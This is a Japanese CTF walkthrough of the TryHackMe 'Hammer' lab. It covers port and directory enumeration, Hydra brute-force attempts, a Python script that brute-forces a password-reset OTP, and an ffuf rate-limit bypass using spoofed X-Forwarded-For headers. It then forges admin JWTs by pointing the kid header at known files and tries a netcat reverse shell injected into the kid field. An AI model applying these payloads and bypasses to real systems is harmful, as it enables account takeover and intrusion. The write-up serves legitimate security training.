# Hammer CTF

https://tryhackme.com/r/room/hammer

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-223-213:~# TARGET=10.10.12.49
root@ip-10-10-223-213:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-28 23:52 GMT
Nmap scan report for 10.10.12.49
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
MAC Address: 02:CE:C1:EF:B6:77 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.59 seconds
root@ip-10-10-223-213:~# sudo nmap -sV -p22,1337 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-28 23:53 GMT
Nmap scan report for 10.10.12.49
Host is up (0.00013s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:CE:C1:EF:B6:77 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
```

22 SSH  
1337 HTTP

### gobuster

```shell
root@ip-10-10-223-213:~# gobuster dir -u http://$TARGET:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.49:1337
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 322] [--> http://10.10.12.49:1337/javascript/]
/vendor               (Status: 301) [Size: 318] [--> http://10.10.12.49:1337/vendor/]
/phpmyadmin           (Status: 301) [Size: 322] [--> http://10.10.12.49:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

http://10.10.12.49:1337/ で何かのログイン画面  
http://10.10.12.49:1337/phpMyAdmin/ でPHP管理のログイン画面が表示される。


パスワードリセット画面（http://10.10.12.49:1337/reset_password.php）で、適当なメールアドレスを入れたら  
「Invalid email address!」と表示されるので、（メールアドレスの候補があれば）総当たり可能。

phpmyadminのデフォルトユーザー名はrootなので、パスワードブルートフォースを試みる。

```HTML
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```


```shell
awk '{print "hmr_" $0}' /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > hmr_dir_list.txt

root@ip-10-10-223-213:~# gobuster dir -u http://$TARGET:1337 -w hmr_dir_list.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.49:1337
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                hmr_dir_list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hmr_images           (Status: 301) [Size: 322] [--> http://10.10.12.49:1337/hmr_images/]
/hmr_css              (Status: 301) [Size: 319] [--> http://10.10.12.49:1337/hmr_css/]
/hmr_js               (Status: 301) [Size: 318] [--> http://10.10.12.49:1337/hmr_js/]
/hmr_logs             (Status: 301) [Size: 320] [--> http://10.10.12.49:1337/hmr_logs/]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

ログファイルがあった。「tester@hammer.thm」というユーザーが存在している？  
また、Linuxユーザーとして「hammerthm」ユーザーが存在していると思われる。

```text
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

### tester@hammer.thm 固定でログインブルートフォース

```shell
hydra -l tester@hammer.thm -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt -s 1337 -f -V 10.10.12.49 http-post-form "/:email=tester%40hammer.thm&password=^PASS^:Invalid Email"
```

ヒットせず。

### 「hammerthm」ユーザーでSSHブルートフォース

```shell
$ hydra -l hammerthm -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-28 19:46:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ssh://10.10.12.49:22/
[ERROR] target ssh://10.10.12.49:22/ does not support password authentication (method reply 4).
```

パスワード認証がサポートされていない模様。

パスワードリセット画面でパスワードリセットしてみる。

```HTTP
POST /reset_password.php HTTP/1.1
Host: 10.10.12.49:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://10.10.12.49:1337
Connection: keep-alive
Referer: http://10.10.12.49:1337/reset_password.php
Cookie: PHPSESSID=9lv19srs80h4718c0d21ji6qa9
Upgrade-Insecure-Requests: 1

recovery_code=1234&s=156
```

sは残り秒数。

## One Time Password 攻撃

Intruderで軽く試したら、数回失敗したらログイン画面に戻されていたので、パスワードリセット画面でアドレス送信、OTP入力を繰り返す。  
今回はOTPを1300固定にした。毎回チャレンジする値をランダムに変えるのでも確率は変わらない。

```python
import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://10.10.67.193:1337/reset_password.php'
otp_url = 'http://10.10.67.193:1337/reset_password.php'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'tester@hammer.thm',
#    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.67.193:1337',
    'Connection': 'keep-alive',
    'Referer': 'http://10.10.67.193:1337/reset_password.php',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "Enter Recovery Code" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'recovery_code': otp,
        's': '150',
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1300'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 200:
            print(f"Session cookies: {session.cookies.get_dict()}")
            if "Invalid or expired recovery code" in response.text:
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")            
                return session.cookies.get_dict()  # Return session cookies after successful bypass
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()

```

```shell
$ python ./opt.py
（十数分）
Trying OTP: 1300
DEBUG: OTP submission response status code: 200
Failed OTP attempt. Redirected to login. OTP: 1300
Logged in successfully.
Trying OTP: 1300
DEBUG: OTP submission response status code: 200
Failed OTP attempt. Redirected to login. OTP: 1300
Logged in successfully.
Trying OTP: 1300
DEBUG: OTP submission response status code: 200
Failed OTP attempt. Redirected to login. OTP: 1300
Logged in successfully.
Trying OTP: 1300
DEBUG: OTP submission response status code: 200
Successfully bypassed 2FA with OTP: 1300
Session cookies: {'PHPSESSID': 'nd6kf6315ugqo5rt3lbek6vmdr'}
```

PHPSESSIDをCookieに設定してブラウザを更新すると、パスワード再設定画面が表示される。  
パスワードを「123」に変更。  
コマンド入力画面が表示される。  
10秒ほどたつと、自動的にログアウトさせられる。

## JWT

これを応答から削除
```js
        function checkTrailUserCookie() {
            const trailUser = getCookie('persistentSession');
            if (!trailUser) {
          
                window.location.href = 'logout.php';
            }
        }

        setInterval(checkTrailUserCookie, 1000); 
```

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NDQwMTA2LCJleHAiOjE3MzU0NDM3MDYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.YpoySuC2ggNeDCBJWn8xRcxs39FOHNSgyTwif_IagpI

{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key"}
{
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1735440106,
    "exp": 1735443706,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "user"
    }
}
```

jsにJWTが書かれている。
```js
<script>
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NDQwMTA2LCJleHAiOjE3MzU0NDM3MDYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
</script>
```

Noneアルゴリズムは効かなかった。

```shell
$ curl -v -X POST http://10.10.12.49:1337/execute_command.php \
-H "Content-Type: application/json" \
-H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NDQwMTA2LCJleHAiOjE3MzU0NDM3MDYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ." \
-d '{"command":"cat /home"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.12.49:1337...
* Connected to 10.10.12.49 (10.10.12.49) port 1337
> POST /execute_command.php HTTP/1.1
> Host: 10.10.12.49:1337
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Type: application/json
> Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NDQwMTA2LCJleHAiOjE3MzU0NDM3MDYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.
> Content-Length: 23
> 
* upload completely sent off: 23 bytes
< HTTP/1.1 302 Found
< Date: Sun, 29 Dec 2024 02:53:41 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=bhnn0m4daqn3cks46jvarvoj0d; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Location: logout.php
< Content-Length: 0
< Content-Type: application/json
< 
* Connection #0 to host 10.10.12.49 left intact
```

### 方針

- /var/www/mykey.key を取得する
- キーをクラックする
- "kid":"/var/www/mykey.key" を既知のファイルパスに置き換える
- mykey.keyが秘密鍵として、公開鍵を見つけて RS256 に変える

/proc/sys/kernel/randomize_va_space  
の値が2であると仮定して、JWTを偽造してみる。

```text
{"typ":"JWT","alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}
{
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1735453706,
    "exp": 1735553706,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

https://jwt.io/
秘密鍵を「2」に設定して、JWTを生成

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3N5cy9rZXJuZWwvcmFuZG9taXplX3ZhX3NwYWNlIn0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NDUzNzA2LCJleHAiOjE3MzU1NTM3MDYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.2F0Me2W1xkoCr5p7CDASqnoVtipkYlFRu2rD7BZ3uns

→　認証されなかった
```

#### コマンドインジェクション

リバースシェルを仕込むが、機能しなかった。
```text
{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key; rm /tmp/f; mkfifo /tmp/f; nc 10.2.22.182 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f"}
{
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1735440106,
    "exp": 1735543706,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}
```

#### キーファイル
コマンドでls実行したら

```text
188ade1.key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor
```
が出てきた。

http://10.10.67.193:1337/188ade1.key  
をダウンロードできた。
```text
56058354efb3daa97ebab00fabd7a7d7
```

```text
{"typ":"JWT","alg":"HS256","kid":"/var/www/html/188ade1.key"}
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1735515215,
  "exp": 1735518815,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NTE1MjE1LCJleHAiOjE3MzU1MTg4MTUsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ._GNjT95QhdIPO7M8SJQ_uoukXEgaTPMll2J92HXhfwo
```

```HTTP
POST /execute_command.php HTTP/1.1
Host: 10.10.67.24:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NTE1MjE1LCJleHAiOjE3MzU1MTg4MTUsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ._GNjT95QhdIPO7M8SJQ_uoukXEgaTPMll2J92HXhfwo
X-Requested-With: XMLHttpRequest
Content-Length: 16
Origin: http://10.10.67.24:1337
Connection: keep-alive
Referer: http://10.10.67.24:1337/dashboard.php
Cookie: PHPSESSID=akj2l133ssa4oltm4pccq8at5c; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM1NTE3MTU4LCJleHAiOjE3MzU1MjA3NTgsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.r4wR6I46-JOg6iafP9NHhtpxJseurCPWXqhlh1vMZxQ; persistentSession=no

{"command":"cat /home/ubuntu/flag.txt"}
```

```http
HTTP/1.1 200 OK
Date: Mon, 30 Dec 2024 00:06:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 37
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"output":"THM{}\n"}
```

完了。

## 振り返り
- ダッシュボードが10秒で勝手にログアウトしたり、コマンドを実行するたびにログアウトさせられる意地の悪い仕様のせいで、本筋と関係ない部分で非常に苦労した。特に、execute_command.php の応答でフラグが返っていたのに、logout.php が発行されているので、成功していることに長時間気づかなかった。

- 他の人のウォークスルーを見たところ、OTP攻撃を下記のコマンドで実行していた。この場合、180秒以内にクラックできなければ、再ログイン、セッションIDを再設定してやり直す必要がある。“X-Forwarded-For: FUZZ”にすることで、IPベースのレート制限をバイパスしているらしい。

```shell
ffuf -w codes.txt -u “http://hammer.thm:1337/reset_password.php" -X “POST” -d “recovery_code=FUZZ&s=60” -H “Cookie: PHPSESSID=Cookie-ID” -H “X-Forwarded-For: FUZZ” -H “Content-Type: application/x-www-form-urlencoded” -fr “Invalid” -s
```

- JWT攻撃の方針としては「"kid":"/var/www/mykey.key" を既知のファイルパスに置き換える」が正解だったが、なぜ「"kid":"/proc/sys/kernel/randomize_va_space"」でうまくいかなかったのかを検証した。結論、ファイルの改行を考慮して「2」だけでなく、「2\n」（Base64で「Mgo=」）をキーとしたら認証された。この方法であれば、キーファイルが提供されなかったとしてもクリア可能だったので覚えておきたい。

```text
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/proc/sys/kernel/randomize_va_space"
}
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1735515215,
  "exp": 1735518815,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  Mgo=
) ※secret base64 encodedを「ON」にする
```
